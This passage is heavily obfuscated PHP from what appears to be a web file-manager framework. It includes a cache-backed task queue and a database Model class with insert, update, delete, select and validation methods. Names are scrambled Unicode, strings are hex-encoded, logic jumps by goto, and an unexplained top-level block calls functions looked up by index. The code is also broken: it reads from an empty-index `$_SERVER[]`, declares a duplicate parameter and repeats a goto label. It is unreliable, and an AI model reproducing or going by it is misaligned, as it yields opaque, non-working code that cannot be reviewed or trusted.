progressEnd($B) { $D =& $_SERVER[]; self::log($D[1591] . $this->task[$D[388]]); $this->end(); } public function progress($BӮ, $eե, $E۹, $aʯꉫ, $e粪) { $B =& $_SERVER[]; $aĆԄ =& $this->task; if ($e粪 > 0) { $aĆԄ[$B[1021]] = $aĆԄ[$B[1021]] == 0 ? $aʯꉫ : $aĆԄ[$B[1021]]; $aĆԄ[$B[1035]] = $e粪; } else { if ($E۹ > 0) { $aĆԄ[$B[1021]] = $aĆԄ[$B[1021]] == 0 ? $eե : $aĆԄ[$B[1021]]; $aĆԄ[$B[1035]] = $E۹; } } $this->update(); self::log("\x70\x72\x6f\147\162\x65\x73\163\x48\x74\x74\x70\72\x64\157\x77\156\x3a{$E۹}\x2f{$eե}\73\40\165\160\x6c\157\141\144\72{$e粪}\x2f{$aʯꉫ}\73"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\141\x73\153\121\165\x65\x75\145\114\145\x6e\147\164\150"; const QUEUE_DATA = "\x74\x61\163\153\x51\165\145\x75\145\104\141\164\141"; public static $listData = false; public static function initTask() { } public static function add($dئ, $a܏ = array(), $a䠢 = '', $c = '') { $Dξ =& $_SERVER[]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($c && array_find_by_field(self::$listData, $Dξ[92], $c)) { return !0; } self::$listData[] = array($Dξ[260] => $dئ, $Dξ[1592] => $a܏, $Dξ[425] => $a䠢, $Dξ[92] => $c); return !0; } public static function addSubmit() { $e =& $_SERVER[]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($e[1593] . json_encode_force(array_to_keyvalue(self::$listData, $e[33], $e[425])), $e[1594]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($c, $e櫅 = array(), $b = '', $D = '') { goto e͔ͣ; a: self::setAll($C̈); return !0; goto f; dʈ: if ($D && array_find_by_field($C̈, $a[92], $D)) { return !0; } $C̈[] = array($a[260] => $c, $a[1592] => $e櫅, $a[425] => $b, $a[92] => $D); write_log($a[1593] . $b, $a[1594]); goto a; e͔ͣ: $a =& $_SERVER[]; if (self::count() >= self::MAX_LENGTH) { return !1; } $C̈ = self::getAll(); goto dʈ; f: } public static function run() { goto eͷ; cٻ: if (!$f딒) { return !1; } self::setAll($d); $E֋ǩ = timeFloat(); goto C; C: try { Hook::apply($f딒[$Eޗ[260]], $f딒[$Eޗ[1592]]); } catch (Exception $Eϋ) { } $E = number_format(timeFloat() - $E֋ǩ, 3) . $Eޗ[1536]; write_log($Eޗ[1595] . $f딒[$Eޗ[425]] . $Eޗ[1596] . $E, $Eޗ[1594]); goto B⽍; B⽍: return !0; goto eݨЉ; eͷ: $Eޗ =& $_SERVER[]; $d = self::getAll(); $f딒 = array_shift($d); goto cٻ; eݨЉ: } public static function count() { $C = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$C) { return 0; } return intval($C); } public static function getAll() { $cˋ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$cˋ) { return array(); } return $cˋ; } public static function setAll($BĿ) { $DËɕ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($BĿ), $DËɕ); Cache::set(self::QUEUE_DATA, $BĿ, $DËɕ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } if ($_SERVER[$_SERVER[][794]] != $_SERVER[$_SERVER[][839]]) { goto CĒ٧; A˯׼: $Dㅣ = explode($_SERVER[][227], $D눪); if (count($Dㅣ) < $_SERVER[][583]) { $Fʈ = $_SERVER[][798]; $Fʈ(); } $FԖ = $_SERVER[][799]; goto AԈ; AԈ: $FԖ($_SERVER[$_SERVER[][792]]); goto fؕ; CĒ٧: $eꃉ = $_SERVER[][795]; $b낅 = $_SERVER[$_SERVER[][796]] . $_SERVER[][797]; $D눪 = $eꃉ($b낅); goto A˯׼; fؕ: } goto Eⷤ; dƣ: define($_SERVER[][238], 0); define($_SERVER[][239], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\145", "\x6f\x72\x64\145\x72", "\141\x6c\x69\141\x73", "\x68\141\x76\151\x6e\x67", "\x67\162\x6f\165\x70", "\x6c\x6f\x63\153", "\x64\151\x73\164\151\156\143\164", "\141\165\x74\x6f", "\146\151\x6c\164\x65\162", "\166\141\x6c\x69\144\141\x74\x65", "\162\145\x73\x75\154\x74", "\x62\151\156\144", "\x74\157\153\x65\x6e"); public function __construct($cƕ = '', $Bⶮ = '', $cÒã = '') { $aٙ =& $_SERVER[]; $this->_initialize(); if (!empty($cƕ)) { if (strpos($cƕ, $aٙ[94])) { list($this->dbName, $this->name) = explode($aٙ[94], $cƕ); } else { $this->name = $cƕ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Bⶮ)) { $this->tablePrefix = $aٙ[33]; } elseif ($aٙ[33] != $Bⶮ) { $this->tablePrefix = $Bⶮ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($aٙ[240]); } $this->db(0, empty($this->connection) ? $cÒã : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $dʹ =& $_SERVER[]; if (empty($this->fields)) { if (think_config($dʹ[241])) { $f = $this->dbName ? $this->dbName : think_config($dʹ[242]); $fЫē = think_var_cache($dʹ[243] . strtolower(get_path_this($f) . $dʹ[94] . $this->name)); if ($fЫē) { $d = think_config($dʹ[244]); if (empty($d) || $fЫē[$dʹ[245]] == $d) { $this->fields = $fЫē; return; } } } $this->flush(); } } public function flush() { goto Eٟ; C: if (!$Bت) { return !1; } $this->fields = array_keys($Bت); $this->fields[$aږ싇[246]] = !1; goto EӢ; EӢ: foreach ($Bت as $FѮ => $bݸ) { $bҏע[$FѮ] = $bݸ[$aږ싇[29]]; if ($bݸ[$aږ싇[36]]) { $this->fields[$aږ싇[247]] = $FѮ; if ($bݸ[$aږ싇[39]]) { $this->fields[$aږ싇[246]] = !0; } } } $this->fields[$aږ싇[248]] = $bҏע; if (think_config($aږ싇[244])) { $this->fields[$aږ싇[245]] = think_config($aږ싇[244]); } goto D; Eٟ: $aږ싇 =& $_SERVER[]; $this->db->setModel($this->name); $Bت = $this->db->getFields($this->getTableName()); goto C; D: if (think_config($aږ싇[241])) { $d؜ = $this->dbName ? $this->dbName : think_config($aږ싇[242]); think_var_cache($aږ싇[243] . strtolower(get_path_this($d؜) . $aږ싇[94] . $this->name), $this->fields); } goto cƝ; cƝ: } public function switchModel($Cޖ, $EĚĺ = array()) { $A =& $_SERVER[]; $d׵ = ucwords(strtolower($Cޖ)) . $A[249]; if (!class_exists($d׵)) { think_exception($d׵ . think_lang($A[250])); } $this->_extModel = new $d׵($this->name); if (!empty($EĚĺ)) { foreach ($EĚĺ as $F) { $this->_extModel->setProperty($F, $this->{$F}); } } return $this->_extModel; } public function __set($c쬗, $C竅) { $this->data[$c쬗] = $C竅; } public function __get($Dͬ܄) { return isset($this->data[$Dͬ܄]) ? $this->data[$Dͬ܄] : null; } public function __isset($bϐ) { return isset($this->data[$bϐ]); } public function __unset($d̎) { unset($this->data[$d̎]); } public function __call($d笷, $F) { $Fվܨ =& $_SERVER[]; if (in_array(strtolower($d笷), $this->methods, !0)) { $this->options[strtolower($d笷)] = $F[0]; return $this; } elseif (in_array(strtolower($d笷), array($Fվܨ[251], $Fվܨ[252], $Fվܨ[253], $Fվܨ[254], $Fվܨ[255]), !0)) { $Fٮ = isset($F[0]) ? $F[0] : $Fվܨ[182]; $Fٮ = $this->db->parseKey($Fٮ); return $this->getField(strtoupper($d笷) . $Fվܨ[256] . $Fٮ . $Fվܨ[257] . $d笷, $Fվܨ[251]); } elseif (strtolower(substr($d笷, 0, 5)) == $Fվܨ[258]) { $Fٮ = think_parse_name(substr($d笷, 5)); $DȮ׌[$Fٮ] = $F[0]; return $this->where($DȮ׌)->find(); } elseif (strtolower(substr($d笷, 0, 10)) == $Fվܨ[259]) { $a˩ = think_parse_name(substr($d笷, 10)); $DȮ׌[$a˩] = $F[0]; return $this->where($DȮ׌)->getField($F[1]); } elseif (isset($this->_scope[$d笷])) { return $this->scope($d笷, $F[0]); } elseif (method_exists($this, $d笷)) { array_unshift($F, $d笷); return call_user_func_array(array($this, $Fվܨ[260]), $F); } else { return call_user_func_array(array(parent, $d笷), $F); } } protected function call() { goto c׃; c׃: $BՏ =& $_SERVER[]; $cȔ = func_get_args(); $C = array_shift($cȔ); goto d՝; a: if (isset($cȔ[$bܹ]) && $cȔ[$bܹ] === $C) { think_exception(__CLASS__ . $BՏ[4] . $C . think_lang($BՏ[261])); return; } $cȔ[] = $C; if (method_exists($this, $BՏ[262])) { $D썇 = call_user_func_array(array($this, $BՏ[263]), array($f, $cȔ)); if (!is_null($D썇) && $D썇 !== !1) { return $D썇; } } goto E; d՝: $f = $C; if (is_array($C)) { $f = $C[1]; $C = $C[0]; } $bܹ = count($cȔ) - 1; goto a; E: $fٮ = call_user_func_array(array($this, $C), $cȔ); if (method_exists($this, $BՏ[264])) { $D썇 = call_user_func_array(array($this, $BՏ[265]), array($f, $cȔ, $fٮ)); if ($D썇) { return $D썇; } } return $fٮ; goto F涠衮; F涠衮: } protected function _initialize() { } protected function _facade($dř) { $F̒ =& $_SERVER[]; if (!empty($this->fields)) { foreach ($dř as $a => $f) { if (is_array($this->fields) && !in_array($a, $this->fields, !0)) { unset($dř[$a]); } elseif (is_scalar($f)) { $this->_parseType($dř, $a); } } } if (!empty($this->options[$F̒[266]])) { $dř = array_map($this->options[$F̒[266]], $dř); unset($this->options[$F̒[266]]); } $this->_beforeWrite($dř); return $dř; } protected function _beforeWrite(&$D) { } public function add($b = '', $F˘ = array(), $b̓ = false) { goto AΗՄ; FĜ: if (!1 === $this->_beforeInsert($b, $F˘)) { return !1; } $E = $this->db->insert($b, $F˘, $b̓); if (!1 !== $E) { $D = $this->getLastInsID(); if ($D) { $b[$this->getPk()] = $D; $this->_after_insert($b, $F˘); return $D; } $this->_after_insert($b, $F˘); } goto F䌆; F䌆: return $E; goto D; AΗՄ: if (empty($b)) { if (!empty($this->data)) { $b = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[][267]); return !1; } } $F˘ = $this->_parseOptions($F˘); $b = $this->_facade($b); goto FĜ; D: } protected function _beforeInsert(&$DȤ, $dڂ) { } protected function _after_insert($b鶿, $B֤) { } public function addAll($AΞߐ, $D = array(), $e = false) { goto fυ; fυ: $Fڦ԰ =& $_SERVER[]; if (empty($AΞߐ)) { $this->error = think_lang($Fڦ԰[267]); return !1; } $D = $this->_parseOptions($D); goto aψ; aψ: foreach ($AΞߐ as $F躶 => $E) { $AΞߐ[$F躶] = $this->_facade($E); } if (method_exists($this->db, $Fڦ԰[268])) { $dޅ = $this->db->insertAll($AΞߐ, $D, $e); } else { $this->startTrans(); foreach ($AΞߐ as $F躶 => $E) { $dޅ = $this->db->insert($E, $D, $e); } $this->commit(); } if (!1 !== $dޅ) { $D = $this->getLastInsID(); if ($D) { return $D; } } goto eڍ; eڍ: return $dޅ; goto f΍; f΍: } public function selectAdd($b꫒ = '', $Dѫܢ = '', $Dη = array()) { $Bۼ֍ =& $_SERVER[]; $Dη = $this->_parseOptions($Dη); if (!1 === ($dǿ = $this->db->selectInsert($b꫒ ? $b꫒ : $Dη[$Bۼ֍[269]], $Dѫܢ ? $Dѫܢ : $this->getTableName(), $Dη))) { $this->error = think_lang($Bۼ֍[270]); return !1; } else { return $dǿ; } } public function save($cԃ = '', $fӜ = array()) { goto f; f: $aўϳ =& $_SERVER[]; if (empty($cԃ)) { if (!empty($this->data)) { $cԃ = $this->data; $this->data = array(); } else { $this->error = think_lang($aўϳ[267]); return !1; } } $cԃ = $this->_facade($cԃ); goto Aޙ; fŹʆه: if (is_array($fӜ[$aўϳ[271]]) && isset($fӜ[$aўϳ[271]][$bͽ])) { $E = $fӜ[$aўϳ[271]][$bͽ]; } if (!1 === $this->_beforeUpdate($cԃ, $fӜ)) { return !1; } $aŐՋ = $this->db->update($cԃ, $fӜ); goto EЮሩ; EЮሩ: if (!1 !== $aŐՋ) { if (isset($E)) { $cԃ[$bͽ] = $E; } $this->_afterUpdate($cԃ, $fӜ); } return $aŐՋ; goto DҨ; Aޙ: $fӜ = $this->_parseOptions($fӜ); $bͽ = $this->getPk(); if (!isset($fӜ[$aўϳ[271]])) { if (isset($cԃ[$bͽ])) { $D඙[$bͽ] = $cԃ[$bͽ]; $fӜ[$aўϳ[271]] = $D඙; unset($cԃ[$bͽ]); } else { $this->error = think_lang($aўϳ[270]); return !1; } } goto fŹʆه; DҨ: } protected function _beforeUpdate(&$f܈, $d¨ن) { } protected function _afterUpdate($Bİ, $F߅) { } public function delete($d = array()) { goto E; E: $Aъ =& $_SERVER[]; if (empty($d) && empty($this->options[$Aъ[271]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $bĪє = $this->getPk(); goto c; d: $aͧ = $this->db->delete($d); if (!1 !== $aͧ) { $FĎ = array(); if (isset($eÓ)) { $FĎ[$bĪє] = $eÓ; } $this->_after_delete($FĎ, $d); } return $aͧ; goto e; c: if (is_numeric($d) || is_string($d)) { if (strpos($d, $Aъ[47])) { $cֆӣ[$bĪє] = array($Aъ[272], $d); } else { $cֆӣ[$bĪє] = $d; } $this->options[$Aъ[271]] = $cֆӣ; } $d = $this->_parseOptions(); if (is_array($d[$Aъ[271]]) && isset($d[$Aъ[271]][$bĪє])) { $eÓ = $d[$Aъ[271]][$bĪє]; } goto d; e: } protected function _after_delete($f伝, $Fܼ͏в) { } public function select($d = array()) { goto D; F: $c = $this->db->select($d); if (!1 === $c) { return !1; } if (empty($c)) { return null; } goto C; D: $a =& $_SERVER[]; if (is_string($d) || is_numeric($d)) { $E˺ߜ = $this->getPk(); if (strpos($d, $a[47])) { $e٢掄[$E˺ߜ] = array($a[272], $d); } else { $e٢掄[$E˺ߜ] = $d; } $this->options[$a[271]] = $e٢掄; } elseif (!1 === $d) { $d = $this->_parseOptions(); return $a[273] . $this->db->buildSelectSql($d) . $a[274]; } $d = $this->_parseOptions(); goto F; C: $this->_afterSelect($c, $d); return $c; goto dٽ篫; dٽ篫: } protected function _afterSelect(&$c͈؆, $Dޠ) { } public function buildSql($C팻 = array()) { $C =& $_SERVER[]; $C팻 = $this->_parseOptions($C팻); return $C[273] . $this->db->buildSelectSql($C팻) . $C[274]; } public function optionsValue($C = null) { if (is_null($C)) { return $this->options; } elseif (is_array($C)) { $this->options = array_merge($this->options, $C); } } protected function _parseOptions($E͜ð = array()) { goto Fݸ; CԆ: if (!isset($E͜ð[$C쭢[275]])) { $E͜ð[$C쭢[275]] = $this->getTableName(); $aţ = $this->fields; } else { $aţ = $this->getDbFields(); } if (!empty($E͜ð[$C쭢[276]])) { $E͜ð[$C쭢[275]] .= $C쭢[50] . $E͜ð[$C쭢[276]]; } $E͜ð[$C쭢[277]] = $this->name; goto c󼺨; c󼺨: if (isset($E͜ð[$C쭢[271]]) && is_array($E͜ð[$C쭢[271]]) && !empty($aţ) && !isset($E͜ð[$C쭢[278]]) && !isset($E͜ð[$C쭢[275]])) { foreach ($E͜ð[$C쭢[271]] as $fƌ => $f) { $fƌ = trim($fƌ); if (in_array($fƌ, $aţ, !0)) { if (is_scalar($f)) { $this->_parseType($E͜ð[$C쭢[271]], $fƌ); } } elseif (!is_numeric($fƌ) && $C쭢[70] != substr($fƌ, 0, 1) && !1 === strpos($fƌ, $C쭢[94]) && !1 === strpos($fƌ, $C쭢[256]) && !1 === strpos($fƌ, $C쭢[279]) && !1 === strpos($fƌ, $C쭢[280])) { unset($E͜ð[$C쭢[271]][$fƌ]); } } } $this->_options_filter($E͜ð); return $E͜ð; goto Dْ; Fݸ: $C쭢 =& $_SERVER[]; if (is_array($E͜ð)) { $E͜ð = array_merge($this->options, $E͜ð); } $this->options = array(); goto CԆ; Dْ: } protected function _options_filter(&$DԿ) { } protected function _parseType(&$a͹, $fл) { $c =& $_SERVER[]; if (empty($this->options[$c[281]][$c[4] . $fл])) { $dЈ۵ = strtolower($this->fields[$c[248]][$fл]); if (!1 !== strpos($dЈ۵, $c[282])) { } elseif (!1 === strpos($dЈ۵, $c[283]) && !1 !== strpos($dЈ۵, $c[284])) { $a͹[$fл] = intval($a͹[$fл]); } elseif (!1 !== strpos($dЈ۵, $c[285]) || !1 !== strpos($dЈ۵, $c[286])) { $a͹[$fл] = floatval($a͹[$fл]); } elseif (!1 !== strpos($dЈ۵, $c[287])) { $a͹[$fл] = (bool) $a͹[$fл]; } } } public function find($c = array()) { goto bш; Aܦ: if (!empty($this->options[$A㋆[289]])) { return $this->returnResult($this->data, $this->options[$A㋆[289]]); } return $this->data; goto dΑؕ; e: if (empty($bҚ̅)) { return null; } $this->data = $bҚ̅[0]; $this->_afterFind($this->data, $c); goto Aܦ; bш: $A㋆ =& $_SERVER[]; if (is_numeric($c) || is_string($c)) { $B[$this->getPk()] = intval($c); $this->options[$A㋆[271]] = $B; } $this->options[$A㋆[288]] = 1; goto E; E: $c = $this->_parseOptions(); $bҚ̅ = $this->db->select($c); if (!1 === $bҚ̅) { return !1; } goto e; dΑؕ: } protected function _afterFind(&$b, $b) { } protected function returnResult($Fτ, $C = '') { $BԶ =& $_SERVER[]; if ($C) { if (is_callable($C)) { return call_user_func($C, $Fτ); } switch (strtolower($C)) { case $BԶ[290]: return json_encode($Fτ); case $BԶ[291]: return xml_encode($Fτ); } } return $Fτ; } public function parseFieldsMap($cȰ, $a쎒ߥ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Aه => $fӊ㹊) { if ($a쎒ߥ == 1) { if (isset($cȰ[$fӊ㹊])) { $cȰ[$Aه] = $cȰ[$fӊ㹊]; unset($cȰ[$fӊ㹊]); } } else { if (isset($cȰ[$Aه])) { $cȰ[$fӊ㹊] = $cȰ[$Aه]; unset($cȰ[$Aه]); } } } } return $cȰ; } public function setField($Cކ, $Dͮޠ = '') { if (is_array($Cކ)) { $a = $Cކ; } else { $a[$Cކ] = $Dͮޠ; } return $this->save($a); } public function setAdd($d秊, $C۪ = 1) { $dϙ =& $_SERVER[]; $A = $d秊 . $dϙ[292] . $C۪; if ($C۪ < 0) { $A = $d秊 . $C۪; } return $this->setField($d秊, array($dϙ[293], $A)); } public function getField($AƧ, $bԈ = null) { $C웞 =& $_SERVER[]; $A⃯[$C웞[269]] = $AƧ; $A⃯ = $this->_parseOptions($A⃯); $AƧ = trim($AƧ); if (strpos($AƧ, $C웞[47])) { if (!isset($A⃯[$C웞[288]])) { $A⃯[$C웞[288]] = is_numeric($bԈ) ? $bԈ : $C웞[33]; } $Aٟҟ = $this->db->select($A⃯); if (!empty($Aٟҟ)) { goto a笭; a笭: $F = explode($C웞[47], $AƧ); $AƧ = array_keys($Aٟҟ[0]); $Eొ = array_shift($AƧ); goto a; bפ: foreach ($Aٟҟ as $f챵) { $eꚓ = $f챵[$Eొ]; if (2 == $C略) { $A̢˧[$eꚓ] = $f챵[$Dꄃ]; } else { $A̢˧[$eꚓ] = is_string($bԈ) ? implode($bԈ, $f챵) : $f챵; } } return $A̢˧; goto e軗; a: $Dꄃ = array_shift($AƧ); $A̢˧ = array(); $C略 = count($F); goto bפ; e軗: } } else { if (!0 !== $bԈ) { $A⃯[$C웞[288]] = is_numeric($bԈ) ? $bԈ : 1; } if ($bԈ === $C웞[251]) { unset($A⃯[$C웞[288]]); } $f챵 = $this->db->select($A⃯); if (!empty($f챵)) { if ($bԈ === $C웞[251]) { return reset($f챵[0]); } if (!0 !== $bԈ && 1 == $A⃯[$C웞[288]]) { return reset($f챵[0]); } foreach ($f챵 as $aնտ) { $bݭ[] = $aնտ[$AƧ]; } return $bݭ; } } return null; } public function create($Dպ = '', $B = '') { goto c; C: if (isset($B)) { if (is_string($B)) { $B = explode($Eڏ[47], $B); } if (think_config($Eڏ[294])) { $B[] = think_config($Eڏ[295]); } foreach ($Dպ as $cϲ => $Bř) { if (!in_array($cϲ, $B)) { unset($Dպ[$cϲ]); } } } if (!$this->autoValidation($Dպ, $B)) { return !1; } if (!$this->autoCheckToken($Dպ)) { $this->error = think_lang($Eڏ[296]); return !1; } goto a; a: if ($this->autoCheckFields) { $B = $this->getDbFields(); foreach ($Dպ as $cϲ => $Bř) { if (!in_array($cϲ, $B)) { unset($Dպ[$cϲ]); } elseif (MAGIC_QUOTES_GPC && is_string($Bř)) { $Dպ[$cϲ] = stripslashes($Bř); } } } $this->autoOperation($Dպ, $B); $this->data = $Dպ; goto D; D: return $Dպ; goto c; eԋ: $Dպ = $this->parseFieldsMap($Dպ, 0); $B = $B ? $B : (!empty($Dպ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Eڏ[269]])) { $B = $this->options[$Eڏ[269]]; unset($this->options[$Eڏ[269]]); } elseif ($B == THINK_MODEL_INSERT && isset($this->insertFields)) { $B = $this->insertFields; } elseif ($B == THINK_MODEL_UPDATE && isset($this->updateFields)) { $B = $this->updateFields; } goto C; c: $Eڏ =& $_SERVER[]; if (empty($Dպ)) { $Dպ = $_POST; } elseif (is_object($Dպ)) { $Dպ = get_object_vars($Dպ); } if (empty($Dպ) || !is_array($Dպ)) { $this->error = think_lang($Eڏ[267]); return !1; } goto eԋ; c: } public function autoCheckToken($b) { $C̃ =& $_SERVER[]; if (isset($this->options[$C̃[297]]) && !$this->options[$C̃[297]]) { return !0; } if (think_config($C̃[294])) { $ả = think_config($C̃[295]); if (!isset($b[$ả]) || Session::get($ả)) { return !1; } list($B, $A) = explode($C̃[70], $b[$ả]); if ($A && Session::get($ả . $C̃[94] . $B) === $A) { Session::remove($ả . $C̃[94] . $B); return !0; } if (think_config($C̃[298])) { Session::remove($ả . $C̃[94] . $B); } return !1; } return !0; } public function regex($a˷, $dա) { $f =& $_SERVER[]; $Cò = array($f[299] => $f[300], $f[301] => $f[302], $f[303] => $f[304], $f[305] => $f[306], $f[307] => $f[308], $f[309] => $f[310], $f[311] => $f[312], $f[286] => $f[313], $f[314] => $f[315]); if (isset($Cò[strtolower($dա)])) { $dա = $Cò[strtolower($dա)]; } return preg_match($dա, $a˷) === 1; } private function autoOperation(&$bԊ, $e؆) { $F =& $_SERVER[]; if (!empty($this->options[$F[316]])) { $eᒉĂ = $this->options[$F[316]]; unset($this->options[$F[316]]); } elseif (!empty($this->_auto)) { $eᒉĂ = $this->_auto; } if (isset($eᒉĂ)) { foreach ($eᒉĂ as $dʍ) { if (empty($dʍ[2])) { $dʍ[2] = THINK_MODEL_INSERT; } if ($e؆ == $dʍ[2] || $dʍ[2] == THINK_MODEL_BOTH) { switch (trim($dʍ[3])) { case $F[317]: case $F[318]: $A = isset($dʍ[4]) ? (array) $dʍ[4] : array(); if (isset($bԊ[$dʍ[0]])) { array_unshift($A, $bԊ[$dʍ[0]]); } if ($F[317] == $dʍ[3]) { $bԊ[$dʍ[0]] = call_user_func_array($dʍ[1], $A); } else { $bԊ[$dʍ[0]] = call_user_func_array(array(&$this, $dʍ[1]), $A); } break; case $F[269]: $bԊ[$dʍ[0]] = $bԊ[$dʍ[1]]; break; case $F[319]: if ($F[33] === $bԊ[$dʍ[0]]) { unset($bԊ[$dʍ[0]]); } break; case $F[320]: default: $bԊ[$dʍ[0]] = $dʍ[1]; } if (!1 === $bԊ[$dʍ[0]]) { unset($bԊ[$dʍ[0]]); } } } } return $bԊ; } protected function autoValidation($F, $E) { $EŔƬ =& $_SERVER[]; if (!empty($this->options[$EŔƬ[321]])) { $f襩ş = $this->options[$EŔƬ[321]]; unset($this->options[$EŔƬ[321]]); } elseif (!empty($this->_validate)) { $f襩ş = $this->_validate; } if (isset($f襩ş)) { if ($this->patchValidate) { $this->error = array(); } foreach ($f襩ş as $F㞠 => $E֒Α) { if (empty($E֒Α[5]) || $E֒Α[5] == THINK_MODEL_BOTH || $E֒Α[5] == $E) { if (0 == strpos($E֒Α[2], $EŔƬ[322]) && strpos($E֒Α[2], $EŔƬ[323])) { $E֒Α[2] = think_lang(substr($E֒Α[2], 2, -1)); } $E֒Α[3] = isset($E֒Α[3]) ? $E֒Α[3] : THINK_EXISTS_VALIDATE; $E֒Α[4] = isset($E֒Α[4]) ? $E֒Α[4] : $EŔƬ[324]; switch ($E֒Α[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($F, $E֒Α)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($EŔƬ[33] != trim($F[$E֒Α[0]])) { if (!1 === $this->_validationField($F, $E֒Α)) { return !1; } } break; default: if (isset($F[$E֒Α[0]])) { if (!1 === $this->_validationField($F, $E֒Α)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($aʆ, $d䚐) { if (!1 === $this->_validationFieldItem($aʆ, $d䚐)) { if ($this->patchValidate) { $this->error[$d䚐[0]] = $d䚐[2]; } else { $this->error = $d䚐[2]; return !1; } } return; } protected function _validationFieldItem($c, $eа) { $Eν =& $_SERVER[]; switch (strtolower(trim($eа[4]))) { case $Eν[317]: case $Eν[318]: $cĉ̻ = isset($eа[6]) ? (array) $eа[6] : array(); if (is_string($eа[0]) && strpos($eа[0], $Eν[47])) { $eа[0] = explode($Eν[47], $eа[0]); } if (is_array($eа[0])) { foreach ($eа[0] as $fʸ) { $bߐ[$fʸ] = $c[$fʸ]; } array_unshift($cĉ̻, $bߐ); } else { array_unshift($cĉ̻, $c[$eа[0]]); } if ($Eν[317] == $eа[4]) { return call_user_func_array($eа[1], $cĉ̻); } else { return call_user_func_array(array(&$this, $eа[1]), $cĉ̻); } case $Eν[325]: return $c[$eа[0]] == $c[$eа[1]]; case $Eν[326]: if (is_string($eа[0]) && strpos($eа[0], $Eν[47])) { $eа[0] = explode($Eν[47], $eа[0]); } $A = array(); if (is_array($eа[0])) { foreach ($eа[0] as $fʸ) { $A[$fʸ] = $c[$fʸ]; } } else { $A[$eа[0]] = $c[$eа[0]]; } if (!empty($c[$this->getPk()])) { $A[$this->getPk()] = array($Eν[327], $c[$this->getPk()]); } if ($this->where($A)->find()) { return !1; } return !0; default: return $this->check($c[$eа[0]], $eа[1], $eа[4]); } } public function check($d֐, $DӢ, $f忍 = "\162\x65\x67\x65\x78") { $Fȉ =& $_SERVER[]; $f忍 = strtolower(trim($f忍)); switch ($f忍) { case $Fȉ[7]: case $Fȉ[328]: $c֑ = is_array($DӢ) ? $DӢ : explode($Fȉ[47], $DӢ); return $f忍 == $Fȉ[7] ? in_array($d֐, $c֑) : !in_array($d֐, $c֑); case $Fȉ[329]: case $Fȉ[330]: if (is_array($DӢ)) { $A© = $DӢ[0]; $c˝ = $DӢ[1]; } else { list($A©, $c˝) = explode($Fȉ[47], $DӢ); } return $f忍 == $Fȉ[329] ? $d֐ >= $A© && $d֐ <= $c˝ : $d֐ < $A© || $d֐ > $c˝; case $Fȉ[331]: case $Fȉ[332]: return $f忍 == $Fȉ[331] ? $d֐ == $DӢ : $d֐ != $DӢ; case $Fȉ[333]: $cۜ = mb_strlen($d֐, $Fȉ[334]); if (strpos($DӢ, $Fȉ[47])) { list($A©, $c˝) = explode($Fȉ[47], $DӢ); return $cۜ >= $A© && $cۜ <= $c˝; } else { return $cۜ == $DӢ; } case $Fȉ[335]: list($D, $a) = explode($Fȉ[47], $DӢ); if (!is_numeric($D)) { $D = strtotime($D); } if (!is_numeric($a)) { $a = strtotime($a); } return NOW_TIME >= $D && NOW_TIME <= $a; case $Fȉ[336]: return in_array(get_client_ip(), explode($Fȉ[47], $DӢ)); case $Fȉ[337]: return !in_array(get_client_ip(), explode($Fȉ[47], $DӢ)); case $Fȉ[324]: default: return $this->regex($d֐, $DӢ); } } public function query($AΪ, $D = false) { $a =& $_SERVER[]; if (!is_bool($D) && !is_array($D)) { $D = func_get_args(); array_shift($D); } $AΪ = str_replace(array($a[227], $a[338]), $a[50], $AΪ); $AΪ = $this->parseSql($AΪ, $D); return $this->db->query($AΪ); } public function execute($eĆ, $a = false) { if (!is_bool($a) && !is_array($a)) { $a = func_get_args(); array_shift($a); } $eĆ = $this->parseSql($eĆ, $a); return $this->db->execute($eĆ); } protected function parseSql($Aޟ, $D) { $C繬 =& $_SERVER[]; if (!0 === $D) { $Aʾ = $this->_parseOptions(); $Aޟ = $this->db->parseSql($Aޟ, $Aʾ); } elseif (is_array($D)) { $D = array_map(array($this->db, $C繬[339]), $D); $Aޟ = vsprintf($Aޟ, $D); } else { $Aޟ = strtr($Aޟ, array($C繬[340] => $this->getTableName(), $C繬[341] => think_config($C繬[240]))); } $this->db->setModel($this->name); return $Aޟ; } public function db($C = '', $Eލӭ = '', $fڄ = array()) { goto c͸͘; F޷: static $Eڃ = array(); if (!isset($Eڃ[$C]) || isset($Eڃ[$C]) && $Eލӭ && $B˅[$C] != $Eލӭ) { if (!empty($Eލӭ) && is_string($Eލӭ) && !1 === strpos($Eލӭ, $D[8])) { $Eލӭ = think_config($Eލӭ); } $Eڃ[$C] = Db::getInstance($Eލӭ); } elseif (NULL === $Eލӭ) { $Eڃ[$C]->close(); unset($Eڃ[$C]); return; } if (!empty($fڄ)) { if (is_string($fڄ)) { parse_str($fڄ, $fڄ); } foreach ($fڄ as $FϪ => $c) { 